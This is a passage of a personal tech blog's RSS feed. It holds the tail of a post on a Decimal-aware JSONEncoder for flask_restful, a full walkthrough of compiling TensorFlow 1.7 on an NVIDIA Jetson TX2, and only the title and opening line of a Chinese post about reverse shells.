&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;查看json.dumps()的文档知道可以通过参数 &amp;lsquo;cls&amp;rsquo; 指定JSONEncoder进行序列化。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;    dumps(obj, *, skipkeys=False, ensure_ascii=True, check_circular=True, allow_nan=True, cls=None, indent=None, separators=None, default=None, sort_keys=False, **kw)
        Serialize ``obj`` to a JSON formatted ``str``.

        To use a custom ``JSONEncoder`` subclass (e.g. one that overrides the
        ``.default()`` method to serialize additional types), specify it with
        the ``cls`` kwarg; otherwise ``JSONEncoder`` is used.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;结合flask_restful，可以自行定义从JSONEncoder继承下来的序列化类，通过在config中的&amp;rsquo;RESTFUL_JSON&amp;rsquo;进行定义。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;  3 import json
  4 import decimal

    ...

  9 class DecimalEncoder(json.JSONEncoder):
 10     def default(self, obj):
 11         if isinstance(obj, decimal.Decimal):
 12             return float(obj)
 13         return super(DecimalEncoder, self).default(obj)
 14
 15 class BaseConfig(object):
 16     RESTFUL_JSON = {&amp;#39;cls&amp;#39;:DecimalEncoder}
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    
    <item>
      <title>Build Tensorflow v1.7 on NVIDIA Jetson tx2</title>
      <link>/2018/04/build-tensorflow-v1.7-on-nvidia-jetson-tx2/</link>
      <pubDate>Thu, 12 Apr 2018 11:06:51 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2018/04/build-tensorflow-v1.7-on-nvidia-jetson-tx2/</guid>
      <description>&lt;!--toc--&gt;
&lt;h1 id=&#34;how-to-install-tensorflow-v17-on-nvidia-jetson-tx2&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#how-to-install-tensorflow-v17-on-nvidia-jetson-tx2&#34;&gt;
        ##
    &lt;/a&gt;
    How to install tensorflow v1.7 on NVIDIA Jetson TX2
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;Tensorflow is a popular machine learning platform and the latest version 1.7 comes out recently. I have a NVIDIA Jetson TX2 development board and I would like to use tensorflow on it, but tensorflow doesn&amp;rsquo;t come along with the Jetpack. Here is what I did to compile one from the source code.&lt;/p&gt;
&lt;h2 id=&#34;environment&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#environment&#34;&gt;
        #
    &lt;/a&gt;
    Environment
&lt;/div&gt;
&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Platform: NVIDIA Jetson TX2&lt;/li&gt;
&lt;li&gt;Jetpack: v3.2&lt;/li&gt;
&lt;li&gt;CUDA: 9.0&lt;/li&gt;
&lt;li&gt;cuDNN: 7.0&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;build-process&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#build-process&#34;&gt;
        #
    &lt;/a&gt;
    Build process
&lt;/div&gt;
&lt;/h2&gt;
&lt;h3 id=&#34;step1-upgrade-jetpack&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#step1-upgrade-jetpack&#34;&gt;
        ##
    &lt;/a&gt;
    Step1: Upgrade Jetpack
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;$ sudo apt-get upgrade&lt;/p&gt;
&lt;h3 id=&#34;step2-compile-bazelhttpsgithubcombazelbuildbazel&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#step2-compile-bazelhttpsgithubcombazelbuildbazel&#34;&gt;
        ##
    &lt;/a&gt;
    Step2: Compile &lt;a href=&#34;https://github.com/bazelbuild/bazel&#34;&gt;bazel&lt;/a&gt;
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;I tried 2 ways to build bazel and realized it&amp;rsquo;s far more easier to build the &amp;lsquo;dist&amp;rsquo; version.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Build Bazel&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;On environment not bootstraping with protoc/grpc installed, use the &amp;lsquo;dist&amp;rsquo; distribution.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget https://github.com/bazelbuild/bazel/releases/download/0.11.1/bazel-0.11.1-dist.zip
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Decompress the source and enter the source root directory, then run the commands below to build bazel:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./compile.sh
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cp output/bazel /usr/local/bin/
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;More words about the non-dist version:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;If you would like to try build from the non-dist version of source code, you can download it from here:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;https://github.com/bazelbuild/bazel/archive/0.11.1.tar.gz
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Building it depends on a bunch of stuffs:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/google/protobuf&#34;&gt;protobuf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://netty.io/wiki/forked-tomcat-native.html#wiki-h2-5&#34;&gt;netty-tcnative&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/grpc/grpc-java/blob/master/COMPILING.md&#34;&gt;grpc-java&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;step3-build-tensorflow&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#step3-build-tensorflow&#34;&gt;
        ##
    &lt;/a&gt;
    Step3: Build tensorflow
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;Install python 2.7 dependencies:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ sudo apt-get install python-numpy python-dev python-pip python-wheel
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Install python 3.x dependencies:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ sudo apt-get install python3-numpy python3-dev python3-pip python3-wheel
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Download source:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wget https://github.com/tensorflow/tensorflow/archive/v1.7.0.tar.gz
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Pre-build configure, here are the settings need to set manually:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Disable Amazon S3 File System support (I have issue of &amp;ldquo;undefined symbol: _ZN3Aws11Environment6GetEnvB5cxx11EPKc&amp;rdquo; while importing tensorflow)&lt;/li&gt;
&lt;li&gt;Enable &amp;lsquo;CUDA&amp;rsquo; support&lt;/li&gt;
&lt;li&gt;cuDNN library path: /usr/lib/aarch64-linux-gnu&lt;/li&gt;
&lt;li&gt;Enable &amp;lsquo;TensorRT&amp;rsquo; and set library path: /usr/lib/aarch64-linux-gnu&lt;/li&gt;
&lt;li&gt;CUDA compute capability: 6.2&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ./configure
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;You have bazel 0.11.1- &lt;span style=&#34;color:#ff6ac1&#34;&gt;(&lt;/span&gt;@non-git&lt;span style=&#34;color:#ff6ac1&#34;&gt;)&lt;/span&gt; installed.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Please specify the location of python. &lt;span style=&#34;color:#ff6ac1&#34;&gt;[&lt;/span&gt;Default is /usr/bin/python&lt;span style=&#34;color:#ff6ac1&#34;&gt;]&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Found possible Python library paths:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  /usr/local/lib/python2.7/dist-packages
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  /usr/lib/python2.7/dist-packages
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Please input the desired Python library path to use.  Default is &lt;span style=&#34;color:#ff6ac1&#34;&gt;[&lt;/span&gt;/usr/local/lib/python2.7/dist-packages&lt;span style=&#34;color:#ff6ac1&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Do you wish to build TensorFlow with jemalloc as malloc support? &lt;span style=&#34;color:#ff6ac1&#34;&gt;[&lt;/span&gt;Y/n&lt;span style=&#34;color:#ff6ac1&#34;&gt;]&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;jemalloc as malloc support will be enabled &lt;span style=&#34;color:#ff6ac1&#34;&gt;for&lt;/span&gt; TensorFlow.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Do you wish to build TensorFlow with Google Cloud Platform support? &lt;span style=&#34;color:#ff6ac1&#34;&gt;[&lt;/span&gt;Y/n&lt;span style=&#34;color:#ff6ac1&#34;&gt;]&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Google Cloud Platform support will be enabled &lt;span style=&#34;color:#ff6ac1&#34;&gt;for&lt;/span&gt; TensorFlow.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Do you wish to build TensorFlow with Hadoop File System support? &lt;span style=&#34;color:#ff6ac1&#34;&gt;[&lt;/span&gt;Y/n&lt;span style=&#34;color:#ff6ac1&#34;&gt;]&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Hadoop File System support will be enabled &lt;span style=&#34;color:#ff6ac1&#34;&gt;for&lt;/span&gt; TensorFlow.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Do you wish to build TensorFlow with Amazon S3 File System support? &lt;span style=&#34;color:#ff6ac1&#34;&gt;[&lt;/span&gt;Y/n&lt;span style=&#34;color:#ff6ac1&#34;&gt;]&lt;/span&gt;: n
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;No Amazon S3 File System support will be enabled &lt;span style=&#34;color:#ff6ac1&#34;&gt;for&lt;/span&gt; TensorFlow.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Do you wish to build TensorFlow with Apache Kafka Platform support? &lt;span style=&#34;color:#ff6ac1&#34;&gt;[&lt;/span&gt;y/N&lt;span style=&#34;color:#ff6ac1&#34;&gt;]&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;No Apache Kafka Platform support will be enabled &lt;span style=&#34;color:#ff6ac1&#34;&gt;for&lt;/span&gt; TensorFlow.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Do you wish to build TensorFlow with XLA JIT support? &lt;span style=&#34;color:#ff6ac1&#34;&gt;[&lt;/span&gt;y/N&lt;span style=&#34;color:#ff6ac1&#34;&gt;]&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;No XLA JIT support will be enabled &lt;span style=&#34;color:#ff6ac1&#34;&gt;for&lt;/span&gt; TensorFlow.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Do you wish to build TensorFlow with GDR support? &lt;span style=&#34;color:#ff6ac1&#34;&gt;[&lt;/span&gt;y/N&lt;span style=&#34;color:#ff6ac1&#34;&gt;]&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;No GDR support will be enabled &lt;span style=&#34;color:#ff6ac1&#34;&gt;for&lt;/span&gt; TensorFlow.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Do you wish to build TensorFlow with VERBS support? &lt;span style=&#34;color:#ff6ac1&#34;&gt;[&lt;/span&gt;y/N&lt;span style=&#34;color:#ff6ac1&#34;&gt;]&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;No VERBS support will be enabled &lt;span style=&#34;color:#ff6ac1&#34;&gt;for&lt;/span&gt; TensorFlow.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Do you wish to build TensorFlow with OpenCL SYCL support? &lt;span style=&#34;color:#ff6ac1&#34;&gt;[&lt;/span&gt;y/N&lt;span style=&#34;color:#ff6ac1&#34;&gt;]&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;No OpenCL SYCL support will be enabled &lt;span style=&#34;color:#ff6ac1&#34;&gt;for&lt;/span&gt; TensorFlow.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Do you wish to build TensorFlow with CUDA support? &lt;span style=&#34;color:#ff6ac1&#34;&gt;[&lt;/span&gt;y/N&lt;span style=&#34;color:#ff6ac1&#34;&gt;]&lt;/span&gt;: y
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;CUDA support will be enabled &lt;span style=&#34;color:#ff6ac1&#34;&gt;for&lt;/span&gt; TensorFlow.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Please specify the CUDA SDK version you want to use, e.g. 7.0. &lt;span style=&#34;color:#ff6ac1&#34;&gt;[&lt;/span&gt;Leave empty to default to CUDA 9.0&lt;span style=&#34;color:#ff6ac1&#34;&gt;]&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Please specify the location where CUDA 9.0 toolkit is installed. Refer to README.md &lt;span style=&#34;color:#ff6ac1&#34;&gt;for&lt;/span&gt; more details. &lt;span style=&#34;color:#ff6ac1&#34;&gt;[&lt;/span&gt;Default is /usr/local/cuda&lt;span style=&#34;color:#ff6ac1&#34;&gt;]&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Please specify the cuDNN version you want to use. &lt;span style=&#34;color:#ff6ac1&#34;&gt;[&lt;/span&gt;Leave empty to default to cuDNN 7.0&lt;span style=&#34;color:#ff6ac1&#34;&gt;]&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Please specify the location where cuDNN &lt;span style=&#34;color:#ff9f43&#34;&gt;7&lt;/span&gt; library is installed. Refer to README.md &lt;span style=&#34;color:#ff6ac1&#34;&gt;for&lt;/span&gt; more details. &lt;span style=&#34;color:#ff6ac1&#34;&gt;[&lt;/span&gt;Default is /usr/local/cuda&lt;span style=&#34;color:#ff6ac1&#34;&gt;]&lt;/span&gt;:/usr/lib/aarch64-linux-gnu/
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Do you wish to build TensorFlow with TensorRT support? &lt;span style=&#34;color:#ff6ac1&#34;&gt;[&lt;/span&gt;y/N&lt;span style=&#34;color:#ff6ac1&#34;&gt;]&lt;/span&gt;: y
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;TensorRT support will be enabled &lt;span style=&#34;color:#ff6ac1&#34;&gt;for&lt;/span&gt; TensorFlow.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Please specify the location where TensorRT is installed. &lt;span style=&#34;color:#ff6ac1&#34;&gt;[&lt;/span&gt;Default is /usr/lib/x86_64-linux-gnu&lt;span style=&#34;color:#ff6ac1&#34;&gt;]&lt;/span&gt;:/usr/lib/aarch64-linux-gnu/
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Please specify a list of comma-separated Cuda compute capabilities you want to build with.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;You can find the compute capability of your device at: https://developer.nvidia.com/cuda-gpus.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Please note that each additional compute capability significantly increases your build &lt;span style=&#34;color:#ff5c57&#34;&gt;time&lt;/span&gt; and binary size. &lt;span style=&#34;color:#ff6ac1&#34;&gt;[&lt;/span&gt;Default is: 3.5,5.2&lt;span style=&#34;color:#ff6ac1&#34;&gt;]&lt;/span&gt;6.2
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Do you want to use clang as CUDA compiler? &lt;span style=&#34;color:#ff6ac1&#34;&gt;[&lt;/span&gt;y/N&lt;span style=&#34;color:#ff6ac1&#34;&gt;]&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nvcc will be used as CUDA compiler.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Please specify which gcc should be used by nvcc as the host compiler. &lt;span style=&#34;color:#ff6ac1&#34;&gt;[&lt;/span&gt;Default is /usr/bin/gcc&lt;span style=&#34;color:#ff6ac1&#34;&gt;]&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Do you wish to build TensorFlow with MPI support? &lt;span style=&#34;color:#ff6ac1&#34;&gt;[&lt;/span&gt;y/N&lt;span style=&#34;color:#ff6ac1&#34;&gt;]&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;No MPI support will be enabled &lt;span style=&#34;color:#ff6ac1&#34;&gt;for&lt;/span&gt; TensorFlow.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Please specify optimization flags to use during compilation when bazel option &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;--config=opt&amp;#34;&lt;/span&gt; is specified &lt;span style=&#34;color:#ff6ac1&#34;&gt;[&lt;/span&gt;Default is -march&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;native&lt;span style=&#34;color:#ff6ac1&#34;&gt;]&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Would you like to interactively configure ./WORKSPACE &lt;span style=&#34;color:#ff6ac1&#34;&gt;for&lt;/span&gt; Android builds? &lt;span style=&#34;color:#ff6ac1&#34;&gt;[&lt;/span&gt;y/N&lt;span style=&#34;color:#ff6ac1&#34;&gt;]&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Not configuring the WORKSPACE &lt;span style=&#34;color:#ff6ac1&#34;&gt;for&lt;/span&gt; Android builds.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Preconfigured Bazel build configs. You can use any of the below by adding &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;--config=&amp;lt;&amp;gt;&amp;#34;&lt;/span&gt; to your build command. See tools/bazel.rc &lt;span style=&#34;color:#ff6ac1&#34;&gt;for&lt;/span&gt; more details.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        --config&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;mkl            &lt;span style=&#34;color:#78787e&#34;&gt;# Build with MKL support.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        --config&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;monolithic     &lt;span style=&#34;color:#78787e&#34;&gt;# Config for mostly static monolithic build.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Configuration finished
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Apply patch &lt;a href=&#34;https://github.com/singleye/KnowledgeBase/blob/master/Tensorflow/Jetpack3.2/tensorrt.patch&#34;&gt;Jetpack3.2/tensorrt.patch&lt;/a&gt; if you want TensorRT support.&lt;/p&gt;
&lt;p&gt;Start the build:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ bazel build --config&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;opt --local_resources 3072,4.0,1.0 --config&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;cuda //tensorflow/tools/pip_package:build_pip_package
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After compilation, generate pip package to &amp;rsquo;target&amp;rsquo; directory:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ./bazel-bin/tensorflow/tools/pip_package/build_pip_package target
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;easy-usage&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#easy-usage&#34;&gt;
        ##
    &lt;/a&gt;
    Easy usage
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;I&amp;rsquo;ve build out the pip &lt;a href=&#34;https://pan.baidu.com/s/1ORp_FCb-ZR-ZAZoGd8CuRw&#34;&gt;package&lt;/a&gt;, feel free to use it to save some time ;-)&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>说一说反弹shell</title>
      <link>/2018/04/%E8%AF%B4%E4%B8%80%E8%AF%B4%E5%8F%8D%E5%BC%B9shell/</link>
      <pubDate>Mon, 09 Apr 2018 23:59:32 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2018/04/%E8%AF%B4%E4%B8%80%E8%AF%B4%E5%8F%8D%E5%BC%B9shell/</guid>
      <description>&lt;!--toc--&gt;
&lt;p&gt;今天简单研究了一下什么是反弹shell以及怎么构造反弹shell，简单总结一下。&lt;/p&gt;
&lt;h1 id=&#34;什么是反弹shell&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e4%bb%80%e4%b9%88%e6%98%af%e5%8f%8d%e5%bc%b9shell&#34;&gt;
        ##
    &lt;/a&gt;
    什么是反弹shell?
&lt;/div&gt;
&lt;/h1&gt;
